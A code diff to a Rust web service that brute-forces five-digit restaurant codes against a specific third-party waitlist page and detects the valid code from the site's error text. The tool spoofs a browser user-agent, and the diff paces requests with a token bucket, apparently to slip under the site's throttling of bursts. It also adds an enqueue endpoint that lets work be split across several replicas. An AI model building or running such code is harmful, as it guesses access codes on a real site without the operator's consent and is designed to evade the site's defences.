@@ -17,25 +17,32 @@
 use axum::extract::{rejection::QueryRejection, Query, State};
 use axum::http::StatusCode;
 use axum::response::{Html, IntoResponse, Json};
-use axum::routing::get;
+use axum::routing::{get, post};
 use axum::Router;
 use futures::stream::{self, StreamExt};
+use governor::{Quota, RateLimiter};
+use governor::state::{InMemoryState, NotKeyed};
+use governor::clock::DefaultClock;
 use reqwest::Client;
 use serde::{Deserialize, Serialize};
 use serde_json::json;
+use std::collections::VecDeque;
 use std::net::SocketAddr;
 use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
 use std::sync::Arc;
 use std::time::Duration;
+use std::num::NonZeroU32;
 use tokio::sync::Mutex;
 
 const TARGET_URL: &str = "https://checktodine.com/customer_waitlist.php?businessid=110";
 const USER_AGENT: &str = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) \
     AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
-/// Kept low on purpose: the site answers 409 Conflict / drops connections
-/// when it sees a burst of concurrent requests from one IP. Raise
-/// cautiously; 100 was briefly OK from a quiet IP but 50 got throttled hard.
-const MAX_CONCURRENT: usize = 100;
+/// Sustained request rate per replica. The site throttles bursty traffic,
+/// so we pace with a token bucket instead of raw concurrency.
+const RATE_PER_SEC: u32 = 100;
+/// Number of worker tasks draining the buffer (high enough that the rate
+/// limiter, not worker count, is the bottleneck).
+const BUFFER_WORKERS: usize = 16;
 const INVALID_MARKER: &str = "Restaurant Code is not valid.";
 /// Exclusive upper bound for `to`: 100000 means "up to and including 99999".
 const MAX_TO: u32 = 100_000;
@@ -68,6 +75,11 @@ struct AppState {
     timeouts: Arc<AtomicU64>,
     net_errors: Arc<AtomicU64>,
     last_error: Arc<Mutex<String>>,
+    /// Buffered work orders (individual codes). Fed by POST /enqueue,
+    /// drained by worker tasks through the rate limiter.
+    buffer: Arc<Mutex<VecDeque<String>>>,
+    /// Token bucket: steady RATE_PER_SEC requests, no bursts.
+    limiter: Arc<RateLimiter<NotKeyed, InMemoryState, DefaultClock>>,
 }
 
 #[derive(Serialize)]
@@ -85,6 +97,7 @@ struct Status {
     timeouts: u64,
     net_errors: u64,
     last_error: String,
+    buffer_len: usize,
 }
 
 /// Releases the single-flight slot when the scan task ends, even on panic.
@@ -194,15 +207,19 @@ async fn submit(state: AppState, code: String) -> bool {
 /// Runs the scan. The caller must hold the single-flight slot: the RunGuard
 /// created in start_handler is moved into the spawned task and releases the
 /// slot when the task ends (even on panic).
+/// Requests are paced through the token-bucket rate limiter (RATE_PER_SEC),
+/// so the site sees a steady rate instead of a concurrency burst.
 async fn try_all(state: AppState, from: u32, to: u32) {
     let total = (to - from) as u64;
-    println!("starting scan of {total} codes ({from:05}..<{to:05})");
+    println!("starting scan of {total} codes ({from:05}..<{to:05}) at {RATE_PER_SEC}/sec");
 
     stream::iter(from..to)
         .map(|i| format!("{i:05}"))
-        .for_each_concurrent(MAX_CONCURRENT, |code| {
+        .for_each_concurrent(BUFFER_WORKERS, |code| {
             let st = state.clone();
             async move {
+                // Wait for a rate-limiter permit (steady 100/sec, no burst).
+                st.limiter.until_ready().await;
                 let _ = submit(st.clone(), code).await;
                 st.tried.fetch_add(1, Ordering::Relaxed);
             }
@@ -214,6 +231,38 @@ async fn try_all(state: AppState, from: u32, to: u32) {
     let tried = state.tried.load(Ordering::Relaxed);
     let stopped = state.stop_requested.load(Ordering::Relaxed);
     println!("scan finished. tried={tried}/{total} found={found} valid={valid} stopped={stopped}");
+}
+
+/// Drains the shared buffer through the rate limiter. Multiple workers run
+/// concurrently; the limiter (not worker count) sets the pace.
+async fn drain_buffer(state: AppState) {
+    loop {
+        if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
+            break;
+        }
+        let code: Option<String> = {
+            let mut buf = state.buffer.lock().await;
+            buf.pop_front()
+        };
+        match code {
+            Some(c) => {
+                state.limiter.until_ready().await;
+                // Re-check stop after waiting for the permit.
+                if state.code_found.load(Ordering::Relaxed) || state.stop_requested.load(Ordering::Relaxed) {
+                    // Put it back; someone else may resume.
+                    let mut buf = state.buffer.lock().await;
+                    buf.push_front(c);
+                    break;
+                }
+                let _ = submit(state.clone(), c).await;
+                state.tried.fetch_add(1, Ordering::Relaxed);
+            }
+            None => {
+                // Buffer empty: idle briefly, then check again (or exit if stopped).
+                tokio::time::sleep(Duration::from_millis(200)).await;
+            }
+        }
+    }
 }
 
 async fn status_handler(State(state): State<AppState>) -> Json<Status> {
@@ -231,7 +280,74 @@ async fn status_handler(State(state): State<AppState>) -> Json<Status> {
         timeouts: state.timeouts.load(Ordering::Relaxed),
         net_errors: state.net_errors.load(Ordering::Relaxed),
         last_error: state.last_error.lock().await.clone(),
+        buffer_len: state.buffer.lock().await.len(),
     })
+}
+
+#[derive(Deserialize)]
+struct EnqueueBody {
+    codes: Vec<String>,
+}
+
+/// POST /enqueue {"codes": ["00001", ...]} — appends work orders to the
+/// replica's buffer. The buffer is drained by workers through the rate
+/// limiter once a buffered scan is started.
+async fn enqueue_handler(
+    State(state): State<AppState>,
+    Json(body): Json<EnqueueBody>,
+) -> impl IntoResponse {
+    let n = body.codes.len();
+    {
+        let mut buf = state.buffer.lock().await;
+        buf.extend(body.codes);
+    }
+    let len = state.buffer.lock().await.len();
+    (
+        StatusCode::OK,
+        Json(json!({"ok": true, "enqueued": n, "buffer_len": len})),
+    )
+}
+
+/// GET /start-buffered — starts draining the buffer through the rate limiter.
+/// Single-flight like /start.
+async fn start_buffered_handler(State(state): State<AppState>) -> impl IntoResponse {
+    if state.is_running.swap(true, Ordering::SeqCst) {
+        return (
+            StatusCode::CONFLICT,
+            Json(json!({"ok": false, "error": "a scan is already running"})),
+        );
+    }
+    let guard = RunGuard {
+        is_running: state.is_running.clone(),
+    };
+    // Fresh per-run state; total is unknown upfront in buffer mode (0 = streaming).
+    reset_run_state(&state, 0, 0).await;
+    {
+        let mut sr = state.scan_range.lock().await;
+        *sr = "buffered".to_string();
+    }
+
+    tokio::spawn(async move {
+        let _guard = guard;
+        let mut workers = Vec::with_capacity(BUFFER_WORKERS);
+        for _ in 0..BUFFER_WORKERS {
+            let st = state.clone();
+            workers.push(tokio::spawn(async move {
+                drain_buffer(st).await;
+            }));
+        }
+        for w in workers {
+            let _ = w.await;
+        }
+        let valid = state.valid_code.lock().await.clone();
+        let found = state.code_found.load(Ordering::Relaxed);
+        let tried = state.tried.load(Ordering::Relaxed);
+        println!("buffered scan finished. tried={tried} found={found} valid={valid}");
+    });
+    (
+        StatusCode::OK,
+        Json(json!({"ok": true, "message": "buffered scan started"})),
+    )
 }
 
 async fn reset_run_state(state: &AppState, from: u32, to: u32) {
@@ -339,6 +455,9 @@ async fn main() {
         .build()
         .expect("build reqwest client");
 
+    let quota = Quota::per_second(NonZeroU32::new(RATE_PER_SEC).unwrap());
+    let limiter = Arc::new(RateLimiter::direct(quota));
+
     let state = AppState {
         client,
         is_running: Arc::new(AtomicBool::new(false)),
@@ -355,6 +474,8 @@ async fn main() {
         timeouts: Arc::new(AtomicU64::new(0)),
         net_errors: Arc::new(AtomicU64::new(0)),
         last_error: Arc::new(Mutex::new("—".to_string())),
+        buffer: Arc::new(Mutex::new(VecDeque::new())),
+        limiter,
     };
 
     let app = Router::new()
@@ -362,6 +483,8 @@ async fn main() {
         .route("/start", get(start_handler))
         .route("/stop", get(stop_handler))
         .route("/status", get(status_handler))
+        .route("/enqueue", post(enqueue_handler))
+        .route("/start-buffered", get(start_buffered_handler))
         .with_state(state);
 
     let addr = SocketAddr::from(([0, 0, 0, 0], port));
